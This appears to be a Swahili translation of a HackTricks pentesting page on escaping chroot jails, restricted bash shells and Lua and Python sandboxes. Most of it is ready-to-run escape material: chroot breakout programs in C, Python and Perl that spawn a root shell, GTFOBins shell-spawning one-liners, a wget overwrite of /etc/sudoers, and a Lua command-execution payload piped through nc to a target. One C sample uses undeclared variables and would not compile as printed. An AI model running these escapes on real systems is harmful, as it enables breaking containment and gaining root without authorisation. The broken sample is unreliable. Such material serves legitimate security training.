# Kutoka kwenye Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Tafuta kwenye** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **ikiwa unaweza kutekeleza binary yoyote yenye property ya "Shell"**

## Njia za Kutoka kwenye Chroot

Kutoka [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Mechanism ya chroot **haijakusudiwa kujilinda** dhidi ya kuchezewa kimakusudi na **watumiaji wenye privileges** (**root**). Kwenye systems nyingi, contexts za chroot hazipangwi vizuri kwa mfululizo, na programs za chroot **zenye privileges za kutosha zinaweza kufanya chroot ya pili ili kutoka**.\
Kwa kawaida hii inamaanisha kwamba ili kutoka unahitaji kuwa root ndani ya chroot.

> [!TIP]
> **tool** [**chw00t**](https://github.com/earthquake/chw00t) iliundwa kutumia vibaya scenarios zifuatazo na kutoka kwenye `chroot`.<sup>[[1]](#references)</sup>

### Root + CWD

> [!WARNING]
> Ikiwa wewe ni **root** ndani ya chroot, **unaweza kutoka** kwa kuunda **chroot nyingine**. Hii ni kwa sababu chroot mbili haziwezi kuwepo pamoja (kwenye Linux), kwa hiyo ukiunda folder kisha **uka create chroot mpya** kwenye folder hiyo mpya huku **wewe ukiwa nje yake**, sasa utakuwa **nje ya chroot mpya** na kwa hiyo utakuwa kwenye FS.
>
> Hii hutokea kwa sababu kwa kawaida chroot HAIBADILISHI working directory yako kuwa ile iliyoonyeshwa, kwa hiyo unaweza kuunda chroot lakini ukawa nje yake.

Kwa kawaida hutapata binary ya `chroot` ndani ya chroot jail, lakini **unaweza ku-compile, ku-upload na ku-execute** binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Hii inafanana na hali ya awali, lakini katika hali hii **attacker huhifadhi file descriptor ya directory ya sasa** na kisha **huunda chroot katika folder mpya**. Mwishowe, kwa kuwa ana **access** ya hiyo **FD** **nje** ya chroot, huifikia na **hutoroka**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD inaweza kupitishwa kupitia Unix Domain Sockets, kwa hiyo:
>
> - Unda child process (fork)
> - Unda UDS ili parent na child ziweze kuwasiliana
> - Endesha chroot katika child process ndani ya folda tofauti
> - Katika parent proc, unda FD ya folda iliyo nje ya chroot mpya ya child proc
> - Pitisha FD hiyo kwa child procc ukitumia UDS
> - Child process ifanye chdir kwenye FD hiyo, na kwa sababu iko nje ya chroot yake, itaweza kutoroka kwenye jail

### Root + Mount

> [!WARNING]
>
> - Mount root device (/) kwenye directory iliyo ndani ya chroot
> - Fanya chroot kwenye directory hiyo
>
> Hili linawezekana katika Linux

### Root + /proc

> [!WARNING]
>
> - Mount procfs kwenye directory iliyo ndani ya chroot (ikiwa bado haijawekwa)
> - Tafuta pid iliyo na root/cwd entry tofauti, kama: /proc/1/root
> - Fanya chroot kwenye entry hiyo

### Root(?) + Fork

> [!WARNING]
>
> - Unda Fork (child proc) na ufanye chroot kwenye folda tofauti iliyo ndani zaidi katika FS, kisha ufanye CD ndani yake
> - Kutoka kwenye parent process, hamisha folda ambayo child process iko ndani yake hadi kwenye folda iliyo kabla ya chroot ya children
> - Children process hii itajikuta nje ya chroot

### ptrace

> [!WARNING]
>
> - Zamani users wangeweza ku-debug processes zao wenyewe kutoka kwenye process yao wenyewe... lakini kwa default hili haliwezekani tena
> - Hata hivyo, ikiwa inawezekana, unaweza kutumia ptrace kuingia kwenye process na kutekeleza shellcode ndani yake ([tazama mfano huu](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Pata taarifa kuhusu jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Rekebisha PATH

Kagua kama unaweza kurekebisha variable ya mazingira ya PATH<sup>[[2]](#references)</sup>.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Kutumia vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers na help viewers

Mazingira mengi yenye vizuizi bado huacha **pagers** au **help viewers** zikiwa zinapatikana. Kwa kawaida, ni rahisi kuzitumia vibaya kuliko kujaribu kuunda upya `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Ikiwa `git` inapatikana, kumbuka kwamba matokeo ya help yake kwa kawaida hupitia pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### One-liners za kawaida za GTFOBins

Mara tu unapojua ni binaries zipi zinaweza kufikiwa, jaribu kwanza shell spawners zilizo dhahiri:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Ikiwa unaweza tu **inject arguments** kwenye command inayoruhusiwa (badala ya kuiendesha kwa uhuru), pia angalia **GTFOArgs**.

### Unda script

Kagua ikiwa unaweza kuunda faili inayotekelezeka yenye _/bin/bash_ kama maudhui.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Pata bash kupitia SSH

Ikiwa unaingia kupitia ssh, mara nyingi unaweza kuiomba server itekeleze **programu tofauti** badala ya restricted login shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Ikiwa `ssh` ni mojawapo ya binary chache zinazoruhusiwa ndani ya mfumo, kumbuka kwamba pia inaweza kutumiwa vibaya kama **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Unaweza kuandika juu ya faili ya sudoers, kwa mfano.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Wrappers za shell zilizowekewa vikwazo (`git-shell`, `rssh`, `lshell`)

Baadhi ya mazingira hayakuingizi moja kwa moja kwenye `rbash` ya kawaida, bali kwenye **wrappers** kama `git-shell`, `rssh`, au `lshell`:

- `git-shell` inakubali tu commands za Git za upande wa server pamoja na chochote kilicho ndani ya `~/git-shell-commands/`. Ikiwa directory hiyo ipo, endesha `help` ili kuorodhesha actions maalum zinazoruhusiwa. Ikiwa unaweza **kuandika** humo, executable yoyote utakayoweka kwenye directory hiyo itafikika.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` kwa kawaida huruhusu tu operations za `scp`, `sftp`, `rsync`, au za mtindo wa Git. Katika hali hizo, lenga kwanza **file write primitives**: upload `authorized_keys`, shell startup file, au helper script kwenye location inayoweza kuandikwa, kisha reconnect kwa `ssh -t ...`.
- Ikiwa wrapper inachuja tu command line, orodhesha binaries zinazofikika kisha pivot kurudi kwenye **GTFOBins / GTFOArgs**.

### Tricks nyingine

Pia angalia:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Ukurasa huu pia unaweza kuwa wa kuvutia:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Tricks kuhusu escaping kutoka kwenye python jails zinapatikana kwenye ukurasa ufuatao:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Kwenye ukurasa huu unaweza kupata global functions unazoweza kufikia ndani ya lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval yenye command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Baadhi ya mbinu za **kuita functions za library bila kutumia nukta**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Orodhesha functions za library:
```bash
for k,v in pairs(string) do print(k,v) end
```
Kumbuka kwamba kila wakati unapotekeleza one liner ya awali katika **different Lua environment mpangilio wa functions hubadilika**. Kwa hivyo, ikiwa unahitaji kutekeleza function fulani, unaweza kufanya brute force attack kwa kupakia Lua environments tofauti na kuita function ya kwanza ya le library:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Pata interactive lua shell**: Ikiwa uko ndani ya limited lua shell, unaweza kupata lua shell mpya (na kwa matumaini isiyo na mipaka) kwa kuita:
```bash
debug.debug()
```
## Marejeo

- [1] [Chw00t: Jinsi ya Kutoka kwenye Suluhisho Mbalimbali za Chroot (Bucsay Balazs, mazungumzo na slides za DeepSec)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash Reference Manual – Shell yenye Vizuizi](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Nyaraka za Git](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
